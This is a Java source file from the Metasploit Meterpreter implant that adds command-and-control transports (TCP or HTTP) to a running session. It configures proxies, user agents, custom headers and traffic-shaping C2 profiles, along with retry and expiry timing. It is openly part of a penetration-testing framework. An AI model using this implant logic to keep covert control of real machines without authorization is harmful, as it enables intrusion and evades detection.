package com.metasploit.meterpreter.core;

import com.metasploit.TLVPacket;
import com.metasploit.TLVType;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.Transport;
import com.metasploit.meterpreter.TcpTransport;
import com.metasploit.meterpreter.HttpTransport;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.stage.C2VerbConfig;

public class core_transport_add implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Transport t = null;
        String transportUrl = request.getStringValue(TLVType.TLV_TYPE_C2_URL);

        if (transportUrl.startsWith("tcp")) {
            t = new TcpTransport(meterpreter, transportUrl);
        } else {
            HttpTransport h = new HttpTransport(meterpreter, transportUrl);

            // do the HTTP specific stuff here, since we know what we are
            h.setUserAgent(request.getStringValue(TLVType.TLV_TYPE_C2_UA, ""));
            h.setProxyUrl(request.getStringValue(TLVType.TLV_TYPE_C2_PROXY_URL, ""));
            h.setProxyUser(request.getStringValue(TLVType.TLV_TYPE_C2_PROXY_USER, ""));
            h.setProxyPass(request.getStringValue(TLVType.TLV_TYPE_C2_PROXY_PASS, ""));
            h.setCustomHeaders(request.getStringValue(TLVType.TLV_TYPE_C2_HEADERS, ""));
            h.setCertHash(request.getRawValue(TLVType.TLV_TYPE_C2_CERT_HASH, null));
            h.setC2Uuid(request.getStringValue(TLVType.TLV_TYPE_C2_UUID, null));

            // Parse C2 profile GET/POST sub-groups if present
            h.setC2Get(parseC2VerbGroup(request, TLVType.TLV_TYPE_C2_GET));
            h.setC2Post(parseC2VerbGroup(request, TLVType.TLV_TYPE_C2_POST));

            t = h;
        }

        // set the timeouts, defaulting the values that are currently set
        // for the current session if nothing has been specified
        try {
            long sessionExpiry = request.getIntValue(TLVType.TLV_TYPE_SESSION_EXPIRY);
            meterpreter.setExpiry(sessionExpiry);
        }
        catch (IllegalArgumentException ignored) {
        }

        try {
            long commTimeout = request.getIntValue(TLVType.TLV_TYPE_C2_COMM_TIMEOUT);
            t.setCommTimeout(commTimeout);
        }
        catch (IllegalArgumentException ex) {
            t.setCommTimeout(meterpreter.getTransports().current().getCommTimeout());
        }

        try {
            long retryTotal = request.getIntValue(TLVType.TLV_TYPE_C2_RETRY_TOTAL);
            t.setRetryTotal(retryTotal);
        }
        catch (IllegalArgumentException ex) {
            t.setRetryTotal(meterpreter.getTransports().current().getRetryTotal());
        }

        try {
            long retryWait = request.getIntValue(TLVType.TLV_TYPE_C2_RETRY_WAIT);
            t.setRetryWait(retryWait);
        }
        catch (IllegalArgumentException ex) {
            t.setRetryWait(meterpreter.getTransports().current().getRetryWait());
        }

        meterpreter.getTransports().add(t);

        return ERROR_SUCCESS;
    }

    private static C2VerbConfig parseC2VerbGroup(TLVPacket request, int groupType) {
        TLVPacket verbGroup;
        try {
            verbGroup = (TLVPacket) request.getValue(groupType);
        } catch (IllegalArgumentException e) {
            return null;
        }

        C2VerbConfig config = new C2VerbConfig();
        config.uri = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_URI, null);
        config.enc = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_ENC, new Integer(0));
        config.prefix = verbGroup.getRawValue(TLVType.TLV_TYPE_C2_PREFIX, null);
        config.suffix = verbGroup.getRawValue(TLVType.TLV_TYPE_C2_SUFFIX, null);
        config.prefixSkip = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_PREFIX_SKIP, new Integer(0));
        config.suffixSkip = (Integer) verbGroup.getValue(TLVType.TLV_TYPE_C2_SUFFIX_SKIP, new Integer(0));
        config.uuidGet = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_GET, null);
        config.uuidHeader = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_HEADER, null);
        config.uuidCookie = verbGroup.getStringValue(TLVType.TLV_TYPE_C2_UUID_COOKIE, null);
        return config;
    }
}
